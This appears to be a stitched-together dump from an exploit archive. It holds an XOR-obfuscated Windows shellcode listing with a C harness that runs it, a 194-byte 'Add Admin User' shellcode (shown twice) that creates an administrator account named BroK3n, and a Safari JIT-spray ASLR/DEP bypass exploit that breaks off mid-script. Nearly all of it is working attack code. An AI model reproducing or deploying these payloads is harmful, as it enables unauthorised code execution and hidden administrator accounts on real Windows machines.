 1a9:   51                      push   %ecx
 1aa:   b9 1d 20 35 5a          mov    $0x5a35201d,%ecx
 1af:   ba 53 65 61 7a          mov    $0x7a616553,%edx
 1b4:   31 d1                   xor    %edx,%ecx
 1b6:   51                      push   %ecx
 1b7:   89 e0                   mov    %esp,%eax
 1b9:   bb 41 41 41 01          mov    $0x1414141,%ebx
 1be:   c1 eb 08                shr    $0x8,%ebx
 1c1:   c1 eb 08                shr    $0x8,%ebx
 1c4:   c1 eb 08                shr    $0x8,%ebx
 1c7:   53                      push   %ebx
 1c8:   50                      push   %eax
 1c9:   bb a6 b4 02 2f          mov    $0x2f02b4a6,%ebx
 1ce:   ba 33 52 64 59          mov    $0x59645233,%edx
 1d3:   31 d3                   xor    %edx,%ebx
 1d5:   ff d3                   call   *%ebx
 1d7:   31 c0                   xor    %eax,%eax
 1d9:   50                      push   %eax
 1da:   b9 09 4c 7c 5e          mov    $0x5e7c4c09,%ecx
 1df:   ba 38 6c 53 38          mov    $0x38536c38,%edx
 1e4:   31 d1                   xor    %edx,%ecx
 1e6:   51                      push   %ecx
 1e7:   b9 42 4d 39 14          mov    $0x14394d42,%ecx
 1ec:   ba 62 62 5d 34          mov    $0x345d6262,%edx
 1f1:   31 d1                   xor    %edx,%ecx
 1f3:   51                      push   %ecx
 1f4:   b9 7a 24 26 75          mov    $0x7526247a,%ecx
 1f9:   ba 2d 6b 74 31          mov    $0x31746b2d,%edx
 1fe:   31 d1                   xor    %edx,%ecx
 200:   51                      push   %ecx
 201:   b9 1d 30 15 28          mov    $0x2815301d,%ecx
 206:   ba 58 77 4a 6c          mov    $0x6c4a7758,%edx
 20b:   31 d1                   xor    %edx,%ecx
 20d:   51                      push   %ecx
 20e:   b9 7c 2f 57 16          mov    $0x16572f7c,%ecx
 213:   ba 53 5b 77 44          mov    $0x44775b53,%edx
 218:   31 d1                   xor    %edx,%ecx
 21a:   51                      push   %ecx
 21b:   b9 42 25 2a 66          mov    $0x662a2542,%ecx
 220:   ba 2d 4b 59 46          mov    $0x46594b2d,%edx
 225:   31 d1                   xor    %edx,%ecx
 227:   51                      push   %ecx
 228:   b9 28 2f 0c 5a          mov    $0x5a0c2f28,%ecx
 22d:   ba 4d 4c 78 33          mov    $0x33784c4d,%edx
 232:   31 d1                   xor    %edx,%ecx
 234:   51                      push   %ecx
 235:   b9 20 2b 26 26          mov    $0x26262b20,%ecx
 23a:   ba 63 44 48 48          mov    $0x48484463,%edx
 23f:   31 d1                   xor    %edx,%ecx
 241:   51                      push   %ecx
 242:   b9 08 2b 23 67          mov    $0x67232b08,%ecx
 247:   ba 66 52 77 34          mov    $0x34775266,%edx
 24c:   31 d1                   xor    %edx,%ecx
 24e:   51                      push   %ecx
 24f:   b9 49 1c 2e 48          mov    $0x482e1c49,%ecx
 254:   ba 69 7a 6a 2d          mov    $0x2d6a7a69,%edx
 259:   31 d1                   xor    %edx,%ecx
 25b:   51                      push   %ecx
 25c:   b9 67 67 1d 37          mov    $0x371d6767,%ecx
 261:   ba 45 47 32 41          mov    $0x41324745,%edx
 266:   31 d1                   xor    %edx,%ecx
 268:   51                      push   %ecx
 269:   b9 03 33 0d 3b          mov    $0x3b0d3303,%ecx
 26e:   ba 71 45 68 49          mov    $0x49684571,%edx
 273:   31 d1                   xor    %edx,%ecx
 275:   51                      push   %ecx
 276:   b9 39 6a 3c 2f          mov    $0x2f3c6a39,%ecx
 27b:   ba 55 4a 6f 4a          mov    $0x4a6f4a55,%edx
 280:   31 d1                   xor    %edx,%ecx
 282:   51                      push   %ecx
 283:   b9 37 44 1f 2e          mov    $0x2e1f4437,%ecx
 288:   ba 5a 2d 71 4f          mov    $0x4f712d5a,%edx
 28d:   31 d1                   xor    %edx,%ecx
 28f:   51                      push   %ecx
 290:   b9 34 23 23 3b          mov    $0x3b232334,%ecx
 295:   ba 68 77 46 49          mov    $0x49467768,%edx
 29a:   31 d1                   xor    %edx,%ecx
 29c:   51                      push   %ecx
 29d:   b9 07 3a 0a 14          mov    $0x140a3a07,%ecx
 2a2:   ba 73 48 65 78          mov    $0x78654873,%edx
 2a7:   31 d1                   xor    %edx,%ecx
 2a9:   51                      push   %ecx
 2aa:   b9 14 2e 58 53          mov    $0x53582e14,%ecx
 2af:   ba 48 6d 37 3d          mov    $0x3d376d48,%edx
 2b4:   31 d1                   xor    %edx,%ecx
 2b6:   51                      push   %ecx
 2b7:   b9 3e 3d 26 32          mov    $0x32263d3e,%ecx
 2bc:   ba 52 6e 43 46          mov    $0x46436e52,%edx
 2c1:   31 d1                   xor    %edx,%ecx
 2c3:   51                      push   %ecx
 2c4:   b9 33 3c 35 34          mov    $0x34353c33,%ecx
 2c9:   ba 5d 48 47 5b          mov    $0x5b47485d,%edx
 2ce:   31 d1                   xor    %edx,%ecx
 2d0:   51                      push   %ecx
 2d1:   b9 36 0e 07 2b          mov    $0x2b070e36,%ecx
 2d6:   ba 58 7a 44 44          mov    $0x44447a58,%edx
 2db:   31 d1                   xor    %edx,%ecx
 2dd:   51                      push   %ecx
 2de:   b9 3c 10 0a 37          mov    $0x370a103c,%ecx
 2e3:   ba 49 62 78 52          mov    $0x52786249,%edx
 2e8:   31 d1                   xor    %edx,%ecx
 2ea:   51                      push   %ecx
 2eb:   b9 24 7c 3b 36          mov    $0x363b7c24,%ecx
 2f0:   ba 61 31 67 75          mov    $0x75673161,%edx
 2f5:   31 d1                   xor    %edx,%ecx
 2f7:   51                      push   %ecx
 2f8:   b9 31 3d 3b 27          mov    $0x273b3d31,%ecx
 2fd:   ba 62 64 68 73          mov    $0x73686462,%edx
 302:   31 d1                   xor    %edx,%ecx
 304:   51                      push   %ecx
 305:   b9 7f 7d 3d 35          mov    $0x353d7d7f,%ecx
 30a:   ba 36 33 78 69          mov    $0x69783336,%edx
 30f:   31 d1                   xor    %edx,%ecx
 311:   51                      push   %ecx
 312:   b9 7c 13 0f 2f          mov    $0x2f0f137c,%ecx
 317:   ba 31 52 4c 67          mov    $0x674c5231,%edx
 31c:   31 d1                   xor    %edx,%ecx
 31e:   51                      push   %ecx
 31f:   b9 1b 08 35 2d          mov    $0x2d35081b,%ecx
 324:   ba 58 49 79 72          mov    $0x72794958,%edx
 329:   31 d1                   xor    %edx,%ecx
 32b:   51                      push   %ecx
 32c:   b9 74 3a 1e 21          mov    $0x211e3a74,%ecx
 331:   ba 2d 65 52 6e          mov    $0x6e52652d,%edx
 336:   31 d1                   xor    %edx,%ecx
 338:   51                      push   %ecx
 339:   b9 16 10 1f 17          mov    $0x171f1016,%ecx
 33e:   ba 34 58 54 52          mov    $0x52545834,%edx
 343:   31 d1                   xor    %edx,%ecx
 345:   51                      push   %ecx
 346:   b9 2f 27 0c 6e          mov    $0x6e0c272f,%ecx
 34b:   ba 4e 43 68 4e          mov    $0x4e68434e,%edx
 350:   31 d1                   xor    %edx,%ecx
 352:   51                      push   %ecx
 353:   b9 39 22 5e 50          mov    $0x505e2239,%ecx
 358:   ba 4b 47 39 70          mov    $0x7039474b,%edx
 35d:   31 d1                   xor    %edx,%ecx
 35f:   51                      push   %ecx
 360:   89 e0                   mov    %esp,%eax
 362:   bb 41 41 41 01          mov    $0x1414141,%ebx
 367:   c1 eb 08                shr    $0x8,%ebx
 36a:   c1 eb 08                shr    $0x8,%ebx
 36d:   c1 eb 08                shr    $0x8,%ebx
 370:   53                      push   %ebx
 371:   50                      push   %eax
 372:   bb a6 b4 02 2f          mov    $0x2f02b4a6,%ebx
 377:   ba 33 52 64 59          mov    $0x59645233,%edx
 37c:   31 d3                   xor    %edx,%ebx
 37e:   ff d3                   call   *%ebx
 380:   31 c0                   xor    %eax,%eax
 382:   50                      push   %eax
 383:   b8 41 41 41 65          mov    $0x65414141,%eax
 388:   c1 e8 08                shr    $0x8,%eax
 38b:   c1 e8 08                shr    $0x8,%eax
 38e:   c1 e8 08                shr    $0x8,%eax
 391:   50                      push   %eax
 392:   b9 1e 53 39 3c          mov    $0x3c39531e,%ecx
 397:   ba 6d 32 5b 50          mov    $0x505b326d,%edx
 39c:   31 d1                   xor    %edx,%ecx
 39e:   51                      push   %ecx
 39f:   b9 04 66 2f 32          mov    $0x322f6604,%ecx
 3a4:   ba 61 46 4b 5b          mov    $0x5b4b4661,%edx
 3a9:   31 d1                   xor    %edx,%ecx
 3ab:   51                      push   %ecx
 3ac:   b9 19 1e 0d 11          mov    $0x110d1e19,%ecx
 3b1:   ba 69 73 62 75          mov    $0x75627369,%edx
 3b6:   31 d1                   xor    %edx,%ecx
 3b8:   51                      push   %ecx
 3b9:   b9 20 41 47 36          mov    $0x36474120,%ecx
 3be:   ba 45 35 67 59          mov    $0x59673545,%edx
 3c3:   31 d1                   xor    %edx,%ecx
 3c5:   51                      push   %ecx
 3c6:   b9 2b 05 64 2a          mov    $0x2a64052b,%ecx
 3cb:   ba 47 69 44 59          mov    $0x59446947,%edx
 3d0:   31 d1                   xor    %edx,%ecx
 3d2:   51                      push   %ecx
 3d3:   b9 10 3f 4f 22          mov    $0x224f3f10,%ecx
 3d8:   ba 62 5a 38 43          mov    $0x43385a62,%edx
 3dd:   31 d1                   xor    %edx,%ecx
 3df:   51                      push   %ecx
 3e0:   b9 2a 6f 2a 24          mov    $0x242a6f2a,%ecx
 3e5:   ba 42 4f 4c 4d          mov    $0x4d4c4f42,%edx
 3ea:   31 d1                   xor    %edx,%ecx
 3ec:   51                      push   %ecx
 3ed:   b9 29 09 1e 5e          mov    $0x5e1e0929,%ecx
 3f2:   ba 47 6c 6a 2d          mov    $0x2d6a6c47,%edx
 3f7:   31 d1                   xor    %edx,%ecx
 3f9:   51                      push   %ecx
 3fa:   89 e0                   mov    %esp,%eax
 3fc:   bb 41 41 41 01          mov    $0x1414141,%ebx
 401:   c1 eb 08                shr    $0x8,%ebx
 404:   c1 eb 08                shr    $0x8,%ebx
 407:   c1 eb 08                shr    $0x8,%ebx
 40a:   53                      push   %ebx
 40b:   50                      push   %eax
 40c:   bb a6 b4 02 2f          mov    $0x2f02b4a6,%ebx
 411:   ba 33 52 64 59          mov    $0x59645233,%edx
 416:   31 d3                   xor    %edx,%ebx
 418:   ff d3                   call   *%ebx
 41a:   31 c0                   xor    %eax,%eax
 41c:   50                      push   %eax
 41d:   b8 41 41 41 6f          mov    $0x6f414141,%eax
 422:   c1 e8 08                shr    $0x8,%eax
 425:   c1 e8 08                shr    $0x8,%eax
 428:   c1 e8 08                shr    $0x8,%eax
 42b:   50                      push   %eax
 42c:   b9 72 2a 05 39          mov    $0x39052a72,%ecx
 431:   ba 52 4b 70 4d          mov    $0x4d704b52,%edx
 436:   31 d1                   xor    %edx,%ecx
 438:   51                      push   %ecx
 439:   b9 54 3a 05 52          mov    $0x52053a54,%ecx
 43e:   ba 35 48 71 6f          mov    $0x6f714835,%edx
 443:   31 d1                   xor    %edx,%ecx
 445:   51                      push   %ecx
 446:   b9 29 16 0a 47          mov    $0x470a1629,%ecx
 44b:   ba 4c 36 79 33          mov    $0x3379364c,%edx
 450:   31 d1                   xor    %edx,%ecx
 452:   51                      push   %ecx
 453:   b9 27 1b 5b 3e          mov    $0x3e5b1b27,%ecx
 458:   ba 55 6d 32 5d          mov    $0x5d326d55,%edx
 45d:   31 d1                   xor    %edx,%ecx
 45f:   51                      push   %ecx
 460:   b9 33 1a 3b 10          mov    $0x103b1a33,%ecx
 465:   ba 41 77 48 75          mov    $0x75487741,%edx
 46a:   31 d1                   xor    %edx,%ecx
 46c:   51                      push   %ecx
 46d:   b9 34 79 3a 12          mov    $0x123a7934,%ecx
 472:   ba 53 59 4e 77          mov    $0x774e5953,%edx
 477:   31 d1                   xor    %edx,%ecx
 479:   51                      push   %ecx
 47a:   b9 1d 5c 1e 28          mov    $0x281e5c1d,%ecx
 47f:   ba 72 32 78 41          mov    $0x41783272,%edx
 484:   31 d1                   xor    %edx,%ecx
 486:   51                      push   %ecx
 487:   b9 2a 4e 5a 28          mov    $0x285a4e2a,%ecx
 48c:   ba 59 2d 7a 4b          mov    $0x4b7a2d59,%edx
 491:   31 d1                   xor    %edx,%ecx
 493:   51                      push   %ecx
 494:   89 e0                   mov    %esp,%eax
 496:   bb 41 41 41 01          mov    $0x1414141,%ebx
 49b:   c1 eb 08                shr    $0x8,%ebx
 49e:   c1 eb 08                shr    $0x8,%ebx
 4a1:   c1 eb 08                shr    $0x8,%ebx
 4a4:   53                      push   %ebx
 4a5:   50                      push   %eax
 4a6:   bb a6 b4 02 2f          mov    $0x2f02b4a6,%ebx
 4ab:   ba 33 52 64 59          mov    $0x59645233,%edx
 4b0:   31 d3                   xor    %edx,%ebx
 4b2:   ff d3                   call   *%ebx
 4b4:   bb f9 7e 5e 22          mov    $0x225e7ef9,%ebx
 4b9:   ba 36 54 3d 54          mov    $0x543d5436,%edx
 4be:   31 d3                   xor    %edx,%ebx
 4c0:   ff d3                   call   *%ebx
 
 
*/
 
#include <stdio.h>
#include <string.h>
 
int main(){
unsigned char shellcode[]= "\x31\xc0\x50\xb8\x41\x41\x41\x64\xc1\xe8\x08\xc1\xe8\x08\xc1\xe8\x08\x50\xb9\x6d\x76\x53\x52\xba\x4d\x59\x32\x36\x31\xd1\x51\xb9\x6e\x72\x61\x71\xba\x4e\x33\x2d\x38\x31\xd1\x51\xb9\x6c\x75\x78\x78\xba\x4c\x34\x34\x31\x31\xd1\x51\xb9\x46\x47\x57\x46\xba\x33\x34\x32\x34\x31\xd1\x51\xb9\x56\x50\x47\x64\xba\x38\x35\x33\x44\x31\xd1\x51\x89\xe0\xbb\x41\x41\x41\x01\xc1\xeb\x08\xc1\xeb\x08\xc1\xeb\x08\x53\x50\xbb\xa6\xb4\x02\x2f\xba\x33\x52\x64\x59\x31\xd3\xff\xd3\x31\xc0\x50\x68\x41\x41\x64\x64\x58\xc1\xe8\x08\xc1\xe8\x08\x50\xb9\x01\x41\x60\x32\xba\x48\x61\x4f\x53\x31\xd1\x51\xb9\x28\x47\x0d\x2f\xba\x5b\x67\x4c\x63\x31\xd1\x51\xb9\x03\x24\x36\x21\xba\x62\x50\x59\x53\x31\xd1\x51\xb9\x34\x41\x15\x18\xba\x5d\x32\x61\x6a\x31\xd1\x51\xb9\x0c\x05\x1b\x25\xba\x68\x68\x72\x4b\x31\xd1\x51\xb9\x2f\x27\x7b\x13\xba\x5a\x57\x5b\x52\x31\xd1\x51\xb9\x1c\x2c\x02\x3e\xba\x70\x4b\x70\x51\x31\xd1\x51\xb9\x3d\x2a\x32\x4c\xba\x51\x45\x51\x2d\x31\xd1\x51\xb9\x23\x5c\x1c\x19\xba\x4d\x39\x68\x39\x31\xd1\x51\x89\xe0\xbb\x41\x41\x41\x01\xc1\xeb\x08\xc1\xeb\x08\xc1\xeb\x08\x53\x50\xbb\xa6\xb4\x02\x2f\xba\x33\x52\x64\x59\x31\xd3\xff\xd3\x31\xc0\x50\x68\x41\x41\x64\x64\x58\xc1\xe8\x08\xc1\xe8\x08\x50\xb9\x02\x63\x6b\x35\xba\x4b\x43\x44\x54\x31\xd1\x51\xb9\x61\x55\x6c\x3d\xba\x43\x75\x2d\x71\x31\xd1\x51\xb9\x27\x3f\x3b\x1a\xba\x54\x5a\x49\x69\x31\xd1\x51\xb9\x25\x34\x12\x67\xba\x4a\x44\x32\x32\x31\xd1\x51\xb9\x0b\x02\x1f\x19\xba\x6e\x71\x74\x6d\x31\xd1\x51\xb9\x39\x3f\x7b\x15\xba\x4d\x5a\x5b\x51\x31\xd1\x51\xb9\x35\x15\x03\x2a\xba\x67\x70\x6e\x45\x31\xd1\x51\xb9\x3a\x17\x75\x46\xba\x6f\x47\x55\x64\x31\xd1\x51\xb9\x26\x35\x0b\x1e\xba\x6a\x72\x59\x51\x31\xd1\x51\xb9\x2a\x2a\x06\x2a\xba\x66\x65\x45\x6b\x31\xd1\x51\xb9\x1d\x20\x35\x5a\xba\x53\x65\x61\x7a\x31\xd1\x51\x89\xe0\xbb\x41\x41\x41\x01\xc1\xeb\x08\xc1\xeb\x08\xc1\xeb\x08\x53\x50\xbb\xa6\xb4\x02\x2f\xba\x33\x52\x64\x59\x31\xd3\xff\xd3\x31\xc0\x50\xb9\x09\x4c\x7c\x5e\xba\x38\x6c\x53\x38\x31\xd1\x51\xb9\x42\x4d\x39\x14\xba\x62\x62\x5d\x34\x31\xd1\x51\xb9\x7a\x24\x26\x75\xba\x2d\x6b\x74\x31\x31\xd1\x51\xb9\x1d\x30\x15\x28\xba\x58\x77\x4a\x6c\x31\xd1\x51\xb9\x7c\x2f\x57\x16\xba\x53\x5b\x77\x44\x31\xd1\x51\xb9\x42\x25\x2a\x66\xba\x2d\x4b\x59\x46\x31\xd1\x51\xb9\x28\x2f\x0c\x5a\xba\x4d\x4c\x78\x33\x31\xd1\x51\xb9\x20\x2b\x26\x26\xba\x63\x44\x48\x48\x31\xd1\x51\xb9\x08\x2b\x23\x67\xba\x66\x52\x77\x34\x31\xd1\x51\xb9\x49\x1c\x2e\x48\xba\x69\x7a\x6a\x2d\x31\xd1\x51\xb9\x67\x67\x1d\x37\xba\x45\x47\x32\x41\x31\xd1\x51\xb9\x03\x33\x0d\x3b\xba\x71\x45\x68\x49\x31\xd1\x51\xb9\x39\x6a\x3c\x2f\xba\x55\x4a\x6f\x4a\x31\xd1\x51\xb9\x37\x44\x1f\x2e\xba\x5a\x2d\x71\x4f\x31\xd1\x51\xb9\x34\x23\x23\x3b\xba\x68\x77\x46\x49\x31\xd1\x51\xb9\x07\x3a\x0a\x14\xba\x73\x48\x65\x78\x31\xd1\x51\xb9\x14\x2e\x58\x53\xba\x48\x6d\x37\x3d\x31\xd1\x51\xb9\x3e\x3d\x26\x32\xba\x52\x6e\x43\x46\x31\xd1\x51\xb9\x33\x3c\x35\x34\xba\x5d\x48\x47\x5b\x31\xd1\x51\xb9\x36\x0e\x07\x2b\xba\x58\x7a\x44\x44\x31\xd1\x51\xb9\x3c\x10\x0a\x37\xba\x49\x62\x78\x52\x31\xd1\x51\xb9\x24\x7c\x3b\x36\xba\x61\x31\x67\x75\x31\xd1\x51\xb9\x31\x3d\x3b\x27\xba\x62\x64\x68\x73\x31\xd1\x51\xb9\x7f\x7d\x3d\x35\xba\x36\x33\x78\x69\x31\xd1\x51\xb9\x7c\x13\x0f\x2f\xba\x31\x52\x4c\x67\x31\xd1\x51\xb9\x1b\x08\x35\x2d\xba\x58\x49\x79\x72\x31\xd1\x51\xb9\x74\x3a\x1e\x21\xba\x2d\x65\x52\x6e\x31\xd1\x51\xb9\x16\x10\x1f\x17\xba\x34\x58\x54\x52\x31\xd1\x51\xb9\x2f\x27\x0c\x6e\xba\x4e\x43\x68\x4e\x31\xd1\x51\xb9\x39\x22\x5e\x50\xba\x4b\x47\x39\x70\x31\xd1\x51\x89\xe0\xbb\x41\x41\x41\x01\xc1\xeb\x08\xc1\xeb\x08\xc1\xeb\x08\x53\x50\xbb\xa6\xb4\x02\x2f\xba\x33\x52\x64\x59\x31\xd3\xff\xd3\x31\xc0\x50\xb8\x41\x41\x41\x65\xc1\xe8\x08\xc1\xe8\x08\xc1\xe8\x08\x50\xb9\x1e\x53\x39\x3c\xba\x6d\x32\x5b\x50\x31\xd1\x51\xb9\x04\x66\x2f\x32\xba\x61\x46\x4b\x5b\x31\xd1\x51\xb9\x19\x1e\x0d\x11\xba\x69\x73\x62\x75\x31\xd1\x51\xb9\x20\x41\x47\x36\xba\x45\x35\x67\x59\x31\xd1\x51\xb9\x2b\x05\x64\x2a\xba\x47\x69\x44\x59\x31\xd1\x51\xb9\x10\x3f\x4f\x22\xba\x62\x5a\x38\x43\x31\xd1\x51\xb9\x2a\x6f\x2a\x24\xba\x42\x4f\x4c\x4d\x31\xd1\x51\xb9\x29\x09\x1e\x5e\xba\x47\x6c\x6a\x2d\x31\xd1\x51\x89\xe0\xbb\x41\x41\x41\x01\xc1\xeb\x08\xc1\xeb\x08\xc1\xeb\x08\x53\x50\xbb\xa6\xb4\x02\x2f\xba\x33\x52\x64\x59\x31\xd3\xff\xd3\x31\xc0\x50\xb8\x41\x41\x41\x6f\xc1\xe8\x08\xc1\xe8\x08\xc1\xe8\x08\x50\xb9\x72\x2a\x05\x39\xba\x52\x4b\x70\x4d\x31\xd1\x51\xb9\x54\x3a\x05\x52\xba\x35\x48\x71\x6f\x31\xd1\x51\xb9\x29\x16\x0a\x47\xba\x4c\x36\x79\x33\x31\xd1\x51\xb9\x27\x1b\x5b\x3e\xba\x55\x6d\x32\x5d\x31\xd1\x51\xb9\x33\x1a\x3b\x10\xba\x41\x77\x48\x75\x31\xd1\x51\xb9\x34\x79\x3a\x12\xba\x53\x59\x4e\x77\x31\xd1\x51\xb9\x1d\x5c\x1e\x28\xba\x72\x32\x78\x41\x31\xd1\x51\xb9\x2a\x4e\x5a\x28\xba\x59\x2d\x7a\x4b\x31\xd1\x51\x89\xe0\xbb\x41\x41\x41\x01\xc1\xeb\x08\xc1\xeb\x08\xc1\xeb\x08\x53\x50\xbb\xa6\xb4\x02\x2f\xba\x33\x52\x64\x59\x31\xd3\xff\xd3\xbb\xf9\x7e\x5e\x22\xba\x36\x54\x3d\x54\x31\xd3\xff\xd3";
fprintf(stdout,"Length: %d\n\n",strlen(shellcode));
    (*(void(*)()) shellcode)();
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

Add Admin User Shellcode (194 bytes) - Any Windows Version
========================================================

Title:          Add Admin User Shellcode (194 bytes) - Any Windows Version
Release date:   21/06/2014
Author:         Giuseppe D'Amore (http://it.linkedin.com/pub/giuseppe-d-amore/69/37/66b)
Size:           194 byte (NULL free)
Tested on:      Win8,Win7,WinVista,WinXP,Win2kPro,Win2k8,Win2k8R2,Win2k3
Username:       BroK3n
Password:       BroK3n

char shellcode[] = "\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"
                   "\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"
                   "\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"
                   "\x34\xaf\x01\xc6\x45\x81\x3e\x57\x69\x6e\x45\x75\xf2\x8b\x7a"
                   "\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf"
                   "\xfc\x01\xc7\x68\x4b\x33\x6e\x01\x68\x20\x42\x72\x6f\x68\x2f"
                   "\x41\x44\x44\x68\x6f\x72\x73\x20\x68\x74\x72\x61\x74\x68\x69"
                   "\x6e\x69\x73\x68\x20\x41\x64\x6d\x68\x72\x6f\x75\x70\x68\x63"
                   "\x61\x6c\x67\x68\x74\x20\x6c\x6f\x68\x26\x20\x6e\x65\x68\x44"
                   "\x44\x20\x26\x68\x6e\x20\x2f\x41\x68\x72\x6f\x4b\x33\x68\x33"
                   "\x6e\x20\x42\x68\x42\x72\x6f\x4b\x68\x73\x65\x72\x20\x68\x65"
                   "\x74\x20\x75\x68\x2f\x63\x20\x6e\x68\x65\x78\x65\x20\x68\x63"
                   "\x6d\x64\x2e\x89\xe5\xfe\x4d\x53\x31\xc0\x50\x55\xff\xd7";


int main(int argc, char **argv){int (*f)();f = (int (*)())shellcode;(int)(*f)();}





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

Add Admin User Shellcode (194 bytes) - Any Windows Version
========================================================

Title:          Add Admin User Shellcode (194 bytes) - Any Windows Version
Release date:   21/06/2014
Author:         Giuseppe D'Amore (http://it.linkedin.com/pub/giuseppe-d-amore/69/37/66b)
Size:           194 byte (NULL free)
Tested on:      Win8,Win7,WinVista,WinXP,Win2kPro,Win2k8,Win2k8R2,Win2k3
Username:       BroK3n
Password:       BroK3n

char shellcode[] = "\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"
                   "\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"
                   "\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"
                   "\x34\xaf\x01\xc6\x45\x81\x3e\x57\x69\x6e\x45\x75\xf2\x8b\x7a"
                   "\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf"
                   "\xfc\x01\xc7\x68\x4b\x33\x6e\x01\x68\x20\x42\x72\x6f\x68\x2f"
                   "\x41\x44\x44\x68\x6f\x72\x73\x20\x68\x74\x72\x61\x74\x68\x69"
                   "\x6e\x69\x73\x68\x20\x41\x64\x6d\x68\x72\x6f\x75\x70\x68\x63"
                   "\x61\x6c\x67\x68\x74\x20\x6c\x6f\x68\x26\x20\x6e\x65\x68\x44"
                   "\x44\x20\x26\x68\x6e\x20\x2f\x41\x68\x72\x6f\x4b\x33\x68\x33"
                   "\x6e\x20\x42\x68\x42\x72\x6f\x4b\x68\x73\x65\x72\x20\x68\x65"
                   "\x74\x20\x75\x68\x2f\x63\x20\x6e\x68\x65\x78\x65\x20\x68\x63"
                   "\x6d\x64\x2e\x89\xe5\xfe\x4d\x53\x31\xc0\x50\x55\xff\xd7";


int main(int argc, char **argv){int (*f)();f = (int (*)())shellcode;(int)(*f)();}


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

<!--
JIT-SPRAY for Safari 4.0.5 - 5.0.0
 
JavaScript JIT SHELLCODE and spray
             for
         ASLR / DEP bypass (Win x32)
          
By Alexey Sintsov
   from Digital Security Research Group
 
Special for Hack In The Box 2010 Amsterdam
 
 
PAYLOAD - exec calc
Tested on Windows7 and Windows XP. (Sorry - have not Mac yet)
  
 
 
 - How it works?
 
 - Answer here:
 http://dsecrg.com/pages/pub/show.php?id=26
 
 
[DSecRG]
www.dsecrg.com
 
-->
<script>
 
 
var SPRAY="";
 
var JIT="{ "+
"var y=("+
"0x22222222^"+ /* START OF OFFSET */
"0x22222222^"+
"0x22222222^"+
"0x22222222^"+
"0x22222222^"+ /*we don't wanna NULLS in pointer*/
"0x22222222^"+
"0x22222222^"+
"0x22222222^"+
"0x22222222^"+ /*SHELLCODE BEGINS*/
 
"0x14ebc031^"+ // xor eax,eax  <------------------ EIP=0xXXYY0104
"0x14eb27b4^"+ // mov ah, 27    ; HC - CHANGE THIS, if u want to write SC to another page
"0x14eb35b0^"+ // mov al, 35    ; HC - ------^
"0x14ebe0f7^"+ // mul eax
"0x14eb00b0^"+ // mov al, 00
"0x14eb00b4^"+ // now EAX = 06010000 - RWX memory pointer for shellcode
"0x14ebc88b^"+ // mov ecx, eax ; now ECX is pointer on RWX mem
 
"0x14ebdb33^"+ // xor ebx, ebx
"0x14eb04b3^"+ // mov bl, 4    ; EBX = 0x4 - step to pointer
               
"0x14ebc031^"+ // xor eax,eax
"0x14eb0bb4^"+ // mov ah, 0b
"0x14ebb5b0^"+ // mov al, fc
"0x14ebe0f7^"+ // mul eax    ;EAX = 0089xxyy
"0x14ebe8b4^"+ // mov ah, e8
"0x14ebfcb0^"+ // mov al, fc ; EAX=0089E8FC - value of shellcode
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
"0x14ebc031^"+ // xor eax,eax
"0x14ebbbb4^"+ // mov ah, bb
"0x14eb88b0^"+ // mov al, 88
"0x14ebe0f7^"+ // mul eax  ; EAX = 8959xxyy
"0x14ebffb4^"+ // mov ah, ff
"0x14ebffb0^"+ // mov al, ff
"0x14eb4090^"+ // inc eax  ; EAX = 89600000
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
"0x14ebc031^"+ // xor eax,eax
"0x14eba0b4^"+ // mov ah, a0
"0x14eba8b0^"+ // mov al, a8
"0x14ebe0f7^"+ // EAX = 64D2xxyy
"0x14eb31b4^"+ // mov ah, 31
"0x14ebe5b0^"+ // mov al, e5 ; EAX = 64D231E5
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14ebbcb4^"+ // mov ah, bc
"0x14ebc4b0^"+ // mov al, c4
"0x14ebe0f7^"+ // EAX = 8B300000
"0x14eb52b4^"+ // mov ah, 52
"0x14eb8bb0^"+ // mov al, 8b ;
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14eb91b4^"+ // mov ah, 91
"0x14eb5eb0^"+ // mov al, 5e
"0x14ebe0f7^"+ // EAX = 528B0000
"0x14eb0cb4^"+ // mov ah, 0c
"0x14eb52b0^"+ // mov al, 52
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14eb65b4^"+ // mov ah, 65
"0x14ebc2b0^"+ // mov al, c2
"0x14ebe0f7^"+ // EAX = 28720000
"0x14eb8bb4^"+ // mov ah, 8b
"0x14eb14b0^"+ // mov al, 14
"0x14ebcb03^"+ // add ecx, ebx ; ecx=ecx+4 - move pointer
"0x14eb0189^"+ // mov [ecx], eax ; copy part of shellcode to RWX page
 
"0x14ebc031^"+ // xor eax,eax
"0x14eb63b4^"+ // mov ah, 63
"0x14eb02b0^"+ // mov al, 02
"0x14ebe0f7^"+ // EAX
"0x14ebb7b4^"+ // mov ah, b7
"0x14eb0fb0^"+ // mov al, 0f
